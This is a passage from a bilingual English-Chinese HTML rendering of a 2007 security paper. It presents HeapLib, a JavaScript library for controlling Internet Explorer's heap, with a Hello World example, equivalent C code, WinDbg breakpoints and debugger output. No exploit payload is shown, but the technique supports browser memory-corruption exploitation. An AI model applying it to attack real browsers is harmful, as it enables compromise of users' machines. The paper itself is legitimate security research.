font-family:Verdana;color:#404040'>FreeCachedMem()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数中</span><span class=code><span lang=EN-US
style='font-size:9.0pt;color:#404040'>min_size &lt; size</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的这个条件就不会被满足。换句话说，如果</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象所占内存大小恰好等于</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>32,64,256</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>或者</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>32768</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的话，这一技术可能失效。不过这好像不能算是一个很大的限制。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>HeapLib -
JavaScript heap manipulation library<o:p></o:p></span></h2>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>HeapLib –
JavaScript </span><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana'>堆操作的函数库</span><span lang=EN-US style='font-size:
12.5pt;font-family:Verdana'><o:p></o:p></span></h2>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>We
implemented the concepts described in the previous section in a JavaScript
library called HeapLib. It provides alloc() and free() functions that map
directly to calls to the system allocator, as well as a number of higher level
heap manipulation routines.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>我把上一节中描述的技术放在一个</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>HeapLib.js</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>函数库中（可以从</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>BlackHat
2007 </span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>欧洲部分文档中下载）。在这个函数库中提供了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>alloc()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>和</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>free()</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>这两个函数。我们可以直接调用这两个函数分配空间，并且保证是绕过</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>OLEAUT32</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，直接使用系统的堆内存分配函数分配内存空间，就像我们直接在使用其他高级语言的堆操作函数一样。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
Hello World of HeapLib<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
most basic program utilizing the HeapLib library is shown below:<o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>&lt;script type=&quot;text/javascript&quot; src=&quot;heapLib.js&quot;&gt;&lt;/script&gt;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>&lt;script type=&quot;text/javascript&quot;&gt;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Create a heapLib object for Internet Explorer<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var heap = new heapLib.ie();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.gc();<span style='mso-spacerun:yes'>      </span>// Run the garbage collector before doing any allocations<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>  </span><span style='mso-spacerun:yes'>  </span>// Allocate 512 bytes of memory and fill it with padding<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.alloc(512);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Allocate a new block of memory for the string &quot;AAAAA&quot; and tag the block with &quot;foo&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.alloc(&quot;AAAAA&quot;, &quot;foo&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Free all blocks tagged with &quot;foo&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.free(&quot;foo&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>&lt;/script&gt;<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>This
program allocates a 16 byte block of memory and copies the string
&quot;AAAAA&quot; into it. The block is tagged with the tag &quot;foo&quot;,
which is later used as an argument to free(). The free() function frees all
memory blocks marked with this tag.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这段程序分配了一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>16</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个字节大小的内存块用于存放</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>&quot;AAAAA&quot;</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。这个内存块被标记为“</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>foo</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>”</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>,</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>随后这个标记又被当作参数传给函数</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>free()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，把这个内存块释放掉。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>In
terms of its effect on the heap, the Hello World program is equivalent to the
following C code:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>如果我们仅仅考虑程序对堆的影响的话，上面这段程序就等价于下面这段</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>C</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>代码：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'><span style='mso-spacerun:yes'>    </span>block1 = HeapAlloc(GetProcessHeap(), 0, 512);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>block2 = HeapAlloc(GetProcessHeap(), 0, 16);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>HeapFree(GetProcessHeap(), 0, block2);<o:p></o:p></span></pre>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Debugging<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>调试</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapLib
provides a number of functions that can be used to debug the library and
inspect its effect on the heap. This is small example that illustrates the
debugging functionality:<o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapLib</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>提供了几个函数用以调试，并且观察它对堆的影响，下面这个程序是使用这些调试函数的一个简单的例子：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>heap.debug(&quot;Hello!&quot;);<span style='mso-spacerun:yes'>   </span>// output a debugging message<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.debugHeap(true);<span style='mso-spacerun:yes'>   </span>// enable tracing of heap allocations<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.alloc(128, &quot;foo&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.debugBreak();<span style='mso-spacerun:yes'>      </span>// break in WinDbg<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.free(&quot;foo&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.debugHeap(false);<span style='mso-spacerun:yes'>  </span>// disable tracing of heap allocations<o:p></o:p></span></pre>

<p><a name=breakpoints></a><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana;color:#404040'>To see the debugging output, attach WinDbg to the
IEXPLORE.EXE process and set the following breakpoints:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>为了观察调试函数的输入情况，我们可以用</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>WinDbg</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>程序附加上</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>IEXPLORE.EXE</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>进程，并且设置下面这些断点：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>bc *<o:p></o:p></span></pre><pre style='margin-left:24.0pt'><span
lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bu <st1:chmetcnv
UnitName="C" SourceValue="7" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">7c</st1:chmetcnv>9106eb &quot;j (poi(esp+4)==0x150000)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>'.printf \&quot;alloc(0x%x) = 0x%x\&quot;, poi(esp+c), eax; .echo; g'; 'g';&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bu ntdll!RtlFreeHeap &quot;j ((poi(esp+4)==0x150000) &amp; (poi(esp+c)!=0))<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>'.printf \&quot;free(0x%x), size=0x%x\&quot;, poi(esp+c), wo(poi(esp+c)-8)*8-8; .echo; g'; 'g';&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bu jscript!JsAtan2 &quot;j (poi(poi(esp+14)+18) == babe)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>'.printf \&quot;DEBUG: %mu\&quot;, poi(poi(poi(esp+14)+8)+8); .echo; g';&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bu jscript!JsAtan &quot;j (poi(poi(esp+14)+8) == babe)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>'.echo DEBUG: Enabling heap breakpoints; be 0 1; g';&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bu jscript!JsAsin &quot;j (poi(poi(esp+14)+8) == babe)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>'.echo DEBUG: Disabling heap breakpoints; bd 0 1; g';&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bu jscript!JsAcos &quot;j (poi(poi(esp+14)+8) == babe)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>'.echo DEBUG: heapLib breakpoint'&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>bd 0 1<span style='mso-spacerun:yes'>  </span><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>g<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
first breakpoint is at the RET instruction of ntdll!RtlAllocateHeap. The
address above is valid for Windows XP SP2, but might need adjustment for other
systems. The breakpoints also assume that the default process heap is at
0x150000. WinDbg's uf and !peb commands provide these addresses:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>第一个断点是下在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ntdll!RtlAllocateHeap</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数中</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>RET</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>指令上的。这个地址是我在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Windows XP
SP2</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>下计算出来的，如果你想在其他操作系统中进行调试的话，恐怕你需要对这个地址进行一下调整。同时我输入上面这些指令时，也假设进程默认堆的起始地址是在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x150000</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>上的。你可以使用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>WinDbg</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>uf</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>和</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>!peb</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>指令来获取自己系统上进程默认堆的地址，如下图所示：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>0:012&gt; uf ntdll!RtlAllocateHeap<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>...<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>ntdll!RtlAllocateHeap+0xea7:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><st1:chmetcnv UnitName="C" SourceValue="7"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on"><span
 lang=EN-US style='font-size:9.0pt;color:#404040'>7c</span></st1:chmetcnv><span
lang=EN-US style='font-size:9.0pt;color:#404040'>9106e6 e817e7ffff<span style='mso-spacerun:yes'>      </span>call<span style='mso-spacerun:yes'>    </span>ntdll!_SEH_epilog (<st1:chmetcnv
UnitName="C" SourceValue="7" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">7c</st1:chmetcnv>90ee02)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><st1:chmetcnv UnitName="C" SourceValue="7"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on"><span
 lang=EN-US style='font-size:9.0pt;color:red'>7c</span></st1:chmetcnv><span
lang=EN-US style='font-size:9.0pt;color:red'>9106eb</span><span lang=EN-US
style='font-size:9.0pt;color:#404040'> c<st1:chmetcnv UnitName="C"
SourceValue="20" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">20c</st1:chmetcnv>00<span style='mso-spacerun:yes'>          </span>ret<span style='mso-spacerun:yes'>     </span>0Ch<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0:012&gt; !peb<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>PEB at 7ffdf000<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>...<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>ProcessHeap:<span style='mso-spacerun:yes'>       </span></span><span
lang=EN-US style='font-size:9.0pt;color:red'>00150000</span><span lang=EN-US
style='font-size:9.0pt;color:#404040'><o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>After
setting these breakpoints, running the sample code above will display the
following debugging output in WinDbg:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在设置了这些断点之后，运行上面的代码，你应该能在</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>WinDbg</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中看到如下所示的输出：</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>DEBUG: Hello!<o:p></o:p></span></pre><pre style='margin-left:
24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>DEBUG: Enabling heap breakpoints<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>alloc(0x80) = 0x1e0b48<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>DEBUG: heapLib breakpoint<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>eax=00000001 ebx=0003e660 ecx=0003e<st1:chmetcnv
UnitName="C" SourceValue="67" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">67c</st1:chmetcnv> edx=00038620 esi=0003e660 edi=0013dc90<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>eip=75ca<st1:chmetcnv
UnitName="F" SourceValue="315" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">315f</st1:chmetcnv> esp=0013dc<st1:chmetcnv UnitName="C"
SourceValue="6" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">6c</st1:chmetcnv> ebp=0013dca0 iopl=0<span style='mso-spacerun:yes'>         </span>nv up ei ng nz ac pe nc<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>cs=001b<span style='mso-spacerun:yes'>  </span>ss=0023<span style='mso-spacerun:yes'>  </span>ds=0023<span style='mso-spacerun:yes'>  </span>es=0023<span style='mso-spacerun:yes'>  </span>fs=003b<span style='mso-spacerun:yes'>  </span>gs=0000<span style='mso-spacerun:yes'>             </span>efl=00000296<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>jscript!JsAcos:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>75ca<st1:chmetcnv
UnitName="F" SourceValue="315" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">315f</st1:chmetcnv> 8bff<span style='mso-spacerun:yes'>            </span>mov<span style='mso-spacerun:yes'>     </span>edi,edi<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0:000&gt; g<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>DEBUG: <st1:place
w:st="on">Flushing</st1:place> the OLEAUT32 cache<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                          </span>free(0x1e0b48), size=0x80<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>DEBUG: Disabling heap breakpoints<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>We
can see that the alloc() function allocated 0x80 bytes of memory at address
0x1e0b48, which was later freed by free(). The sample program also triggers a
breakpoint in WinDbg by calling debugBreak() from HeapLib. This function is
implemented as a call to the JavaScript acos() function with a special
parameter, which triggers the WinDbg breakpoint on jscript!JsAcos. This gives
us the opportunity to inspect the state of the heap before continuing with the
JavaScript execution.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>我们看见</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>alloc()</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>函数分配了地址</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x1e0b48</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>上的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x80</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个字节的内存块，然后又用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>free()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数把这个内存块给释放掉了。在这个示例程序中我们还看到</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>WinDbg</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在调用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HeapLib</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>debugBreak()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数时自动下了一个断点。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>debugBreak()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这个函数实际上是以用一个特殊的参数（</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>0xbabe</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>）调用了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>acos()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数，从而触发了断点（在</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>WinDbg</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的断点位于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>jscript!JsAcos</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>）的方式来实现的（详见</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>HeapLib.js</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的第</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>102</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>～</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>104</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>行）。调用这个函数我们就能在程序运行时，暂停一下程序，看看堆中的情况。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

